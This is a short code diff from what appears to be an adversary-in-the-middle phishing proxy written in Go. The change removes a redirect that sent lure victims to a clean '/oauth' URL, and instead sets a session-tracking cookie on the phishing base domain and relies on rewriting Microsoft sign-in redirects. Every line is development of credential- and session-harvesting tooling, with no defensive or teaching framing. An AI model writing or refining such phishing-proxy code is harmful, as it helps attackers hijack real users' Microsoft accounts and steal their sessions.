@@ -2151,26 +2151,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 									// --- End device code chaining ---
 
-									// AitM flow: redirect to /oauth?tid=RANDOM for clean URL
-									if dcMode == DCModeOff || dcMode == "" {
-										tid := genNumericTid()
-										redirectURL := fmt.Sprintf("/oauth?tid=%s", tid)
-										log.Debug("[%d] [AitM] redirecting lure to: %s", sid, redirectURL)
-										resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-										resp.Header.Set("Location", redirectURL)
-										resp.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
-										ck := &http.Cookie{
-											Name:    getSessionCookieName(pl_name, p.cookieName),
-											Value:   session.Id,
-											Path:    "/",
-											Domain:  p.cfg.GetBaseDomain(),
-											Expires: time.Now().Add(60 * time.Minute),
-										}
-										resp.Header.Add("Set-Cookie", ck.String())
-										return req, resp
-									}
-
-									// Fallback: set session cookie and let proxy pass through
+									// AitM flow: set session cookie and let landing page load
+									// URL rewriting happens automatically via rewrite_urls when Microsoft redirects
 									ck := &http.Cookie{
 										Name:    getSessionCookieName(pl_name, p.cookieName),
 										Value:   session.Id,
